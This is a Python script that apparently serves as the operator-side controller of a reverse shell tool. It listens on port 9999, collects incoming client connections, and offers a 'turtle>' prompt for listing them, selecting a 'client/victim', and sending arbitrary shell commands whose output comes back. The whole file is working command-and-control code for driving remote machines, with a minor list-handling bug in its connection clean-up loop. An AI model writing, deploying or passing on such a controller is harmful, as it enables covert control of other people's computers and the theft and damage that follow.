import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_address = []

# create a socket object
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket() # create a socket object
    except socket.error as mg:
        print("Socket creation error: " + str(mg))
# bind port and host together
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the port: " + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as mg:
        print("Socket binding error: " + str(mg))
        bind_socket()
# Handling connections from multiple clients and saving to a list
# Closing previous connections when server.py file is restarted
def accepting_connections():
    for c in all_connections:
        c.close()
        del all_connections[:]
        del all_address[:]
    while True:
        try:
            conn, add = s.accept()
            s.setblocking(1) # prevents timeout
            all_connections.append(conn)
            all_address.append(add)
            print("Connection has been established: " + add[0])
        except socket.error as mg:
            print("Error accepting connections: " + str(mg))
            s.close()  
# 2nd thread functions - 1) See all the clients 2) Select a client 3) Send commands to the connected client
# Interactive prompt for sending commands
# turtle> list
# 0 Friend-A Port
# 1 Friend-B Port
# 2 Friend-C Port
# turtle> select 1
#
def start_turtle():
    while True:
        cmd = input('turtle> ')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print("Command not recognized")
# Display all current active connections with the client
def list_connections():
    results = ''
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_address[i]
            continue
        results += str(i) + " " + str(all_address[i][0]) + " " + str(all_address[i][1]) + "\n"
    print("----Clients----" + "\n" + results)
# Selecting the target
def get_target(cmd):
    try:
        target = cmd.replace('select ', '')
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to: " + str(all_address[target][0]))
        print(str(all_address[target][0]) + '> ', end="")
        return conn
    except:
        print("Selection not valid")
        return None
# Send commands to client/victim or a friend
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
        except:
            print("Error sending commands")
            break
# Create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()
# Do the next job in the queue (one handles connections, other sends commands)
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connections()
        if x == 2:
            start_turtle()
        queue.task_done()
# Create jobs
def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()
create_workers()
create_jobs()
